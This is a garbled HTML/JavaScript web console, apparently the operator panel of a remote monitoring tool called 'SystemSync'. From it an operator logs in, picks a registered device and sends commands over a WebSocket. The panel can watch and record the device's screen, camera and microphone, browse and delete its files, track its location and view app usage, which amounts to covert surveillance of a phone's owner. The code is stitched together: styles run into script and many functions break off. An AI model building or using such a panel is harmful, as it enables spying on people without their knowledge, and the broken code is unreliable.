<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Remote Monitoring</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <style>
        /* ========== All existing styles (unchanged) ========== */
        :root {
            --primary: #0f62fe;
            --primary-hover: #0353e9;
            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;
            --text-main: #12161b;
            --text-sec: #5c6a7a;
            --border: #e2e8f0;
            --danger: #e02424;
            --danger-bg: #fdf2f2;
            --success: #057a55;
            --success-bg: #f3faf7;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg-body);
            font-family: 'Inter', system-ui, sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: var(--text-main);
        }

        button,
        input,
        select,
        textarea {
            font-family: inherit;
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: transparent;
        }

        ::-webkit-scrollbar-thumb {
            background: #cbd5e1;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #94a3b8;
        }

        #sidebar {
            width: 280px;
            background: rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(16px);
            border-right: 1px solid rgba(255, 255, 255, 0.4);
            padding: 20px 16px;
            overflow-y: auto;
            flex-shrink: 0;
            box-shadow: 1px 0 10px rgba(0, 0, 0, 0.02);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 200;
        }

        .logo {
            font-size: 20px;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            letter-spacing: -0.5px;
        }

        #sidebarCloseBtn {
            display: none;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: var(--text-sec);
        }

        .section {
            margin-bottom: 24px;
        }

        .section-title {
            font-size: 11px;
            font-weight: 700;
            color: #94a3b8;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 0.5px;
            padding-left: 8px;
        }

        #sidebar button {
            width: 100%;
            padding: 10px 14px;
            margin: 2px 0;
            background: transparent;
            color: var(--text-main);
            border: none;
            border-radius: var(--radius-sm);
            font-size: 14px;
            font-weight: 500;
            text-align: left;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        #sidebar button span:first-child {
            font-size: 16px;
            opacity: 0.8;
        }

        #sidebar button:hover {
            background: #f0f4f8;
            color: var(--primary);
            transform: translateX(2px);
        }

        .camera-panel {
            background: #f8fafc;
            border-radius: var(--radius-sm);
            padding: 16px;
            margin: 8px 0 16px;
            border: 1px solid var(--border);
            display: none;
        }

        .camera-panel.show {
            display: block;
            animation: slideDown 0.2s ease-out;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-5px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .camera-option {
            margin: 8px 0;
            font-size: 13px;
            display: flex;
            gap: 12px;
        }

        .camera-option label {
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .capture-btn,
        .live-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            width: 100%;
            margin-top: 12px;
            font-weight: 600;
            transition: 0.2s;
        }

        .capture-btn:hover,
        .live-btn:hover {
            background: var(--primary-hover);
            box-shadow: 0 4px 10px rgba(15, 98, 254, 0.2);
        }

        #main {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-width: 0;
            background: var(--bg-body);
        }

        #header {
            height: 64px;
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(16px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.4);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            flex-shrink: 0;
            box-shadow: var(--shadow-sm);
            z-index: 10;
        }

        #menuBtn {
            display: none;
            background: #f1f5f9;
            border: none;
            border-radius: var(--radius-sm);
            padding: 8px;
            font-size: 18px;
            cursor: pointer;
            color: var(--text-main);
            transition: 0.2s;
        }

        #menuBtn:hover {
            background: #e2e8f0;
        }

        #headerTitle {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-main);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        #serverInfo {
            font-weight: 400;
            color: var(--text-sec);
            font-size: 14px;
            margin-left: 8px;
        }

        #status {
            padding: 6px 16px;
            border-radius: 20px;
            background: #eff6ff;
            color: var(--primary);
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        #status::before {
            content: '';
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--primary);
            box-shadow: 0 0 6px var(--primary);
        }

        #status.offline {
            background: var(--danger-bg);
            color: var(--danger);
        }

        #status.offline::before {
            background: var(--danger);
            box-shadow: 0 0 6px var(--danger);
        }

        #reconnectBtn {
            background: var(--bg-surface);
            color: var(--text-sec);
            border: 1px solid var(--border);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            font-size: 14px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
            margin-left: 10px;
        }

        #reconnectBtn:hover {
            background: #f1f5f9;
            color: var(--text-main);
            transform: rotate(45deg);
        }

        #content {
            flex: 1;
            padding: 24px;
            overflow: auto;
        }

        #main-panel {
            background: var(--bg-surface);
            border-radius: var(--radius-md);
            padding: 32px;
            min-height: 100%;
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border);
        }

        #main-panel h3 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--text-main);
        }

        #main-panel p {
            color: var(--text-sec);
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.6;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 14px;
            margin-top: 10px;
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            overflow: hidden;
            display: table;
        }

        th {
            background: #f8fafc;
            padding: 12px 16px;
            text-align: left;
            color: var(--text-sec);
            font-weight: 600;
            border-bottom: 1px solid var(--border);
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        td {
            padding: 14px 16px;
            border-bottom: 1px solid #f1f5f9;
            color: var(--text-main);
            vertical-align: middle;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tbody tr {
            transition: background 0.15s;
        }

        tbody tr:hover {
            background: #f8fafc;
        }

        .pagination {
            margin-top: 20px;
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .page-btn {
            padding: 6px 14px;
            border: 1px solid #cbd5e1;
            background: white;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: 0.2s;
        }

        .page-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
        }

        #authContainer,
        #deviceListContainer {
            position: fixed;
            inset: 0;
            background: rgba(244, 247, 251, 0.7);
            backdrop-filter: blur(12px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20000;
        }

        #authBox,
        #deviceListBox {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: var(--radius-lg);
            width: 400px;
            max-width: 90%;
            box-shadow: var(--shadow-lg);
            border: 1px solid rgba(255, 255, 255, 0.4);
            animation: fadeInScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.95);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        #authBox h2,
        #deviceListBox h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 24px;
            text-align: center;
            color: var(--text-main);
            letter-spacing: -0.5px;
        }

        #authBox input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            background: #f8fafc;
            border: 1px solid #cbd5e1;
            border-radius: var(--radius-sm);
            font-size: 14px;
            outline: none;
            transition: 0.2s;
        }

        #authBox input:focus {
            border-color: var(--primary);
            background: #fff;
            box-shadow: 0 0 0 4px rgba(15, 98, 254, 0.1);
        }

        #authBox button,
        #logoutBtn {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.2s;
            margin-top: 12px;
        }

        #authBox button:hover,
        #logoutBtn:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(15, 98, 254, 0.25);
        }

        #logoutBtn {
            background: #f1f5f9;
            color: var(--text-main);
            border: 1px solid #cbd5e1;
            margin-top: 24px;
        }

        #logoutBtn:hover {
            background: #e2e8f0;
            color: var(--danger);
            box-shadow: none;
            border-color: #cbd5e1;
        }

        .toggle-link {
            color: var(--text-sec);
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 24px;
            cursor: pointer;
            transition: 0.2s;
            text-decoration: none;
            display: block;
            background: #f1f5f9;
            padding: 12px;
            border-radius: var(--radius-sm);
        }

        .toggle-link:hover {
            color: var(--primary);
            background: #e2e8f0;
            transform: translateY(-1px);
        }

        .device-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: var(--radius-md);
            margin-bottom: 12px;
            cursor: pointer;
            transition: 0.2s;
            background: var(--bg-surface);
        }

        .device-item:hover {
            transform: translateY(-2px);
            border-color: var(--primary);
            box-shadow: var(--shadow-md);
        }

        .device-info {
            flex: 1;
            margin-left: 16px;
        }

        .device-name {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 4px;
        }

        .device-id {
            font-size: 13px;
            color: var(--text-sec);
            font-family: monospace;
        }

        .device-arrow {
            color: var(--primary);
            font-size: 20px;
            font-weight: bold;
            opacity: 0;
            transform: translateX(-10px);
            transition: 0.2s;
        }

        .device-item:hover .device-arrow {
            opacity: 1;
            transform: translateX(0);
        }

        /* File Manager Tree View */
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(8px);
            z-index: 10;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }

        .tree-root {
            list-style: none;
            padding-left: 0;
        }

        .tree-children {
            display: grid;
            grid-template-rows: 0fr;
            transition: grid-template-rows 0.3s ease-out;
        }

        .tree-children.expanded {
            grid-template-rows: 1fr;
        }

        .tree-children-inner {
            overflow: hidden;
            padding-left: 20px;
            list-style: none;
            border-left: 1px dashed var(--border);
            margin-left: 10px;
            padding-top: 4px;
            padding-bottom: 4px;
        }

        .folder-header,
        .file-row {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: 0.15s;
            border: 1px solid transparent;
            position: relative;
        }

        .folder-header:hover,
        .file-row:hover {
            background: #f8fafc;
            border-color: var(--border);
        }

        .folder-icon {
            font-size: 18px;
            margin-right: 12px;
            width: 24px;
            text-align: center;
            color: #fbbf24;
        }

        .file-icon {
            font-size: 18px;
            margin-right: 12px;
            width: 24px;
            text-align: center;
            color: #94a3b8;
        }

        .chevron {
            font-size: 12px;
            margin-right: 8px;
            transition: transform 0.3s;
            color: var(--text-sec);
            display: inline-block;
            width: 12px;
        }

        .chevron.down {
            transform: rotate(90deg);
        }

        .item-name {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-main);
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            user-select: none;
        }

        .file-size {
            font-size: 12px;
            color: var(--text-sec);
            margin-left: 10px;
        }

        .file-actions {
            opacity: 0;
            transition: opacity 0.2s;
            margin-left: 16px;
            display: inline-flex;
            gap: 6px;
        }

        .file-row:hover .file-actions {
            opacity: 1;
        }

        .file-action-btn {
            background: #fff;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
        }

        .file-action-btn:hover {
            background: #f1f5f9;
            box-shadow: var(--shadow-sm);
        }

        .file-action-btn.dl:hover {
            color: var(--primary);
            border-color: var(--primary);
        }

        .file-action-btn.del:hover {
            color: var(--danger);
            border-color: var(--danger);
        }

        /* New checkbox style */
        .file-checkbox {
            margin-right: 10px;
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        #map,
        #historyMap {
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border);
        }

        .map-info {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            padding: 12px 16px;
            border-radius: var(--radius-sm);
            font-size: 13px;
            font-weight: 500;
            border-left: 4px solid var(--primary);
            z-index: 1000;
            box-shadow: var(--shadow-md);
            max-width: 280px;
        }

        .current-location-marker {
            background: #0f62fe;
            border-radius: 50%;
            width: 14px;
            height: 14px;
            border: 2px solid white;
            box-shadow: 0 0 0 4px rgba(15, 98, 254, 0.3);
        }

        .btn-ui {
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: 0.2s;
            border: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn-ui.primary {
            background: var(--primary);
            color: white;
        }

        .btn-ui.primary:hover {
            background: var(--primary-hover);
            box-shadow: 0 4px 10px rgba(15, 98, 254, 0.2);
            transform: translateY(-1px);
        }

        .btn-ui.secondary {
            background: #f1f5f9;
            color: var(--text-main);
            border: 1px solid #cbd5e1;
        }

        .btn-ui.secondary:hover {
            background: #e2e8f0;
        }

        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            background: #e2e8f0;
            color: #475569;
        }

        .badge.blue {
            background: #eff6ff;
            color: #1d4ed8;
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(4px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            animation: fadeIn 0.2s;
        }

        .modal-overlay.show {
            display: flex;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .mobile-popup {
            width: min(92vw, calc(92vh * 9 / 16));
            height: min(92vh, calc(92vw * 16 / 9));
            display: flex;
            flex-direction: column;
            background: #000;
            border-radius: var(--radius-lg);
            border: 1px solid #333;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }

        .phone-frame {
            flex: 1;
            min-height: 0;
            background: black;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .phone-frame video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .popup-controls {
            flex-shrink: 0;
            background: #111;
            padding: 16px;
            display: flex;
            gap: 12px;
            justify-content: center;
        }

        .popup-controls button {
            width: 48px;
            height: 48px;
            background: #222;
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            font-size: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }

        .popup-controls button:hover {
            background: #333;
            transform: scale(1.05);
        }

        .popup-controls button.close-btn {
            background: var(--danger);
        }

        .popup-controls button.close-btn:hover {
            background: #b91c1c;
        }

        #downloadProgress {
            background: white;
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 16px;
            margin: 0 24px 16px;
            display: none;
            box-shadow: var(--shadow-sm);
        }

        #progressBar {
            width: 0%;
            height: 8px;
            background: var(--primary);
            border-radius: 4px;
            transition: width 0.3s;
        }

        .app-usage-item {
            display: flex;
            align-items: center;
            padding: 14px;
            border-bottom: 1px solid #eef2f5;
            gap: 16px;
        }

        .app-usage-name {
            flex: 1;
            font-weight: 500;
            font-size: 14px;
        }

        .app-usage-time {
            width: 100px;
            text-align: right;
            color: var(--text-sec);
            font-size: 13px;
            font-family: monospace;
        }

        .usage-bar-container {
            flex: 2;
            height: 24px;
            background: #f1f5f9;
            border-radius: 12px;
            overflow: hidden;
        }

        .usage-bar {
            height: 100%;
            border-radius: 12px;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            padding-right: 12px;
            color: white;
            font-size: 11px;
            font-weight: 600;
        }

        .event-card {
            background: white;
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 16px;
            transition: 0.2s;

        let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;

        // Helper functions
        function escapeHtml(s) { if (!s) return ''; return s.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m])); }
        function formatBytes(b) { if (b === 0) return '0 B'; const i = Math.floor(Math.log(b) / Math.log(1024)); return (b / Math.pow(1024, i)).toFixed(1) + ' ' + ['B', 'KB', 'MB', 'GB'][i]; }
        function formatDuration(ms) { const h = Math.floor(ms / 3600000); const m = Math.floor((ms % 3600000) / 60000); const s = Math.floor((ms % 60000) / 1000); return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`; }
        function formatDurationSeconds(seconds) { if (!seconds) return ''; const mins = Math.floor(seconds / 60); const secs = seconds % 60; return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`; }
        function getColorForDuration(ms) { if (ms > 3600000) return '#d32f2f'; if (ms > 1800000) return '#ff9800'; return '#4caf50'; }
        function setStatus(s) { statusEl.innerText = s; if (s === 'ONLINE') { statusEl.classList.remove('offline'); statusEl.style.background = '#e8f5e9'; statusEl.style.color = '#2e7d32'; } else { statusEl.classList.add('offline'); statusEl.style.background = '#ffebee'; statusEl.style.color = '#c62828'; } }
        function showNotification(t) { const o = statusEl.innerText; statusEl.innerText = t; setTimeout(() => statusEl.innerText = o, 2000); }
        function pushAlert(t, b) { newAlerts.unshift({ title: t, body: b, time: new Date().toLocaleTimeString() }); if (newAlerts.length > 50) newAlerts.pop(); const badge = document.getElementById('alertsBadge'), list = document.getElementById('alertsList'); if (badge) { badge.style.display = 'block'; list.innerHTML = ''; newAlerts.forEach(a => { const d = document.createElement('div'); d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px'; d.textContent = a.time + ' ' + a.title + ': ' + a.body; list.appendChild(d); }); } }
        function clearAlerts() { newAlerts = []; document.getElementById('alertsBadge').style.display = 'none'; }
        function downloadBase64(b64, fn) { const a = document.createElement('a'); a.href = 'data:application/octet-stream;base64,' + b64; a.download = fn; a.click(); }
        function toggleSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if (ov) ov.classList.toggle('show'); }
        function closeSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if (ov) ov.classList.remove('show'); }

        // ==================== AUTH ====================
        function toggleFlashOptions() {
            const clickCam = document.querySelector('input[name="clickCameraSelect"]:checked').value;

        }

        function renderAuthForm() {
            const c = document.getElementById('authBox');
            if (isLoginMode) c.innerHTML = `<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode" tabindex="0">Don't have an account? Sign up</div><div id="authError"></div>`;
            else c.innerHTML = `<h2>✨ Create Account</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" /><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode" tabindex="0">Already have an account? Sign in</div><div id="authError"></div>`;

            document.getElementById('toggleAuthMode').onclick = (e) => { e.preventDefault(); isLoginMode = !isLoginMode; renderAuthForm(); };

        async function handleAuth() {
            const email = document.getElementById('authEmail').value.trim();
            const pwd = document.getElementById('authPassword').value.trim();
            const err = document.getElementById('authError');
            if (!email || !pwd) { err.innerText = 'Please fill all fields'; return; }
            const btn = document.getElementById('authBtn');
            btn.innerText = 'Processing...';
            try {
                if (!isLoginMode) {
                    const cf = document.getElementById('authConfirmPassword').value.trim();
                    if (pwd !== cf) { err.innerText = 'Passwords do not match'; btn.innerText = 'Sign Up'; return; }
                    await auth.createUserWithEmailAndPassword(email, pwd);
                } else {
                    await auth.signInWithEmailAndPassword(email, pwd);
                }
            } catch (e) {
                err.innerText = e.message;
                btn.innerText = isLoginMode ? 'Sign In' : 'Sign Up';
            }
        }

        function logout() {
            auth.signOut();
            if (ws) ws.close();
            if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);

            document.getElementById('sidebar').style.display = 'none';

            document.getElementById('deviceListContainer').style.display = 'none';
            document.getElementById('authContainer').style.display = 'flex';

        async function loadDevices() {
            if (!currentUser) return;
            const snap = await db.collection('devices').where('userId', '==', currentUser.uid).get();
            const list = document.getElementById('deviceList');
            list.innerHTML = '';
            if (snap.empty) list.innerHTML = '<p style="color:#999; text-align:center;">No devices registered.</p>';
            else snap.forEach(doc => {
                const d = doc.data();
                const div = document.createElement('div');
                div.className = 'device-item';
                div.onclick = () => selectDevice(d.deviceId, d.name || 'Unknown');

                list.appendChild(div);
            });
            document.getElementById('deviceListContainer').style.display = 'flex';
        }

        window.leaveDevice = function () {
            selectedDeviceId = null;
            document.getElementById('main').style.display = 'none';
            document.getElementById('sidebar').style.display = 'none';

            if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);

        window.addEventListener('popstate', (e) => {
            if (!e.state || e.state.view !== 'device') {

        function selectDevice(id, name) {
            history.pushState({ view: 'device' }, '', '#device');
            document.getElementById('headerLeaveBtn').style.display = 'inline-block';
            selectedDeviceId = id;
            document.getElementById('deviceListContainer').style.display = 'none';

            if (!selectedDeviceId || !currentUser) return;
            await loadDeviceInfo();
            if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);
            deviceInfoRefreshInterval = setInterval(() => loadDeviceInfo(), 30000);

        async function loadDeviceInfo() {
            if (!selectedDeviceId || !currentUser) return;
            try {
                const doc = await db.collection('devices').doc(selectedDeviceId).get();
                if (doc.exists) {
                    const data = doc.data();
                    const name = data.name || 'Unnamed';
                    const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleString() : 'Never';
                    document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(name)} <span style="font-size:12px; color:#666;">(last seen: ${escapeHtml(lastSeen)})</span>`;
                } else {
                    document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(selectedDeviceId)} <span style="font-size:12px; color:#666;">(no info)</span>`;

        // ==================== WEBSOCKET ====================
        function connectWebSocket() {
            if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;

            setStatus('CONNECTING');
            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
            panel.innerHTML = '⏳ Connecting to server...';
            ws = new WebSocket(CONFIG.WS_URL);
            ws.onopen = () => { reconnectAttempts = 0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML = '✅ Connected to server. Ready.'; if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE'; };
            ws.onmessage = e => handleIncomingMessage(e.data);
            ws.onclose = () => { setStatus('OFFLINE'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: closed'; panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws = null; const d = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer = setTimeout(() => connectWebSocket(), d); };
            ws.onerror = () => { setStatus('ERROR'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error'; };
        }

        function manualReconnect() { if (reconnectTimer) clearTimeout(reconnectTimer); if (ws) ws.close(); reconnectAttempts = 0; connectWebSocket(); }

        function sendCommand(cmd, params = {}) {
            if (!ws || ws.readyState !== WebSocket.OPEN) { panel.innerHTML = '<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>'; return; }
            const payload = { type: 'COMMAND', command: cmd, requestId: 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5), params, deviceId: selectedDeviceId, timestamp: Date.now() };
            ws.send(JSON.stringify(payload));
            panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
            pendingCommand = cmd;
            setTimeout(() => { if (pendingCommand === cmd) pendingCommand = null; }, 10000);
        }

        function sendPlainText(t) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(t); }

        // ==================== WEBRTC ====================
        function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS) {
            const pc = new RTCPeerConnection({ iceServers: iceServers });
            if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
            else if (type === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
            else if (type === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
            pc.ontrack = onTrack;
            pc.onicecandidate = e => { if (e.candidate) sendSignaling({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType: type }); };
            pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
            return pc;
        }

        function sendSignaling(msg) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'SIGNALING', deviceId: selectedDeviceId, data: msg })); }

        function handleSignaling(msg) {
            if (msg.type === 'ANSWER') { const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC; if (pc) pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp })); }
            else if (msg.type === 'ICE_CANDIDATE') { const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC; if (pc && msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
        }

        async function toggleScreen() {

                if (screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
                screenMediaRecorder = null;
                screenRecordedChunks = [];
                const modalVideo = document.getElementById('modalScreenVideo');
                if (modalVideo) modalVideo.srcObject = null;
            } else {
                document.getElementById('screenModalOverlay').classList.add('show');
                document.body.classList.add('modal-open');
                const modalVideo = document.getElementById('modalScreenVideo');
                if (modalVideo) modalVideo.srcObject = null;
                screenPC = createPeerConnection('screen', e => {

                    if (modalVideo && e.streams[0]) {
                        modalVideo.srcObject = e.streams[0];
                        console.log('Screen stream received');
                    }
                }, false);
                try {
                    const offer = await screenPC.createOffer();
                    await screenPC.setLocalDescription(offer);

                    document.getElementById('screenBtn').innerText = 'Stop Screen';

        function toggleScreenRecording() {
            const video = document.getElementById('modalScreenVideo');
            if (!video || !video.srcObject) {
                alert('No active screen share. Start screen share first.');
                return;
            }
            if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
                screenMediaRecorder.stop();
                document.getElementById('modalRecordBtn').innerText = '🔴';
                showNotification('Recording stopped');
            } else {
                if (video.videoWidth === 0) {
                    video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
                } else {
                    startScreenRecording();
                }
            }
        }

        function startScreenRecording() {
            const video = document.getElementById('modalScreenVideo');
            if (!video || !video.videoWidth) {
                alert('Video not ready. Please wait.');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            const drawFrame = () => {
                if (video.videoWidth && video.videoHeight) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                }
                requestAnimationFrame(drawFrame);
            };
            drawFrame();
            const canvasStream = canvas.captureStream(30);
            const originalStream = video.srcObject;
            if (originalStream && originalStream.getAudioTracks().length) {
                originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
            }
            screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
            screenMediaRecorder.ondataavailable = e => {
                if (e.data.size > 0) screenRecordedChunks.push(e.data);
            };
            screenMediaRecorder.onstop = () => {
                const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `screen-recording-${Date.now()}.webm`;
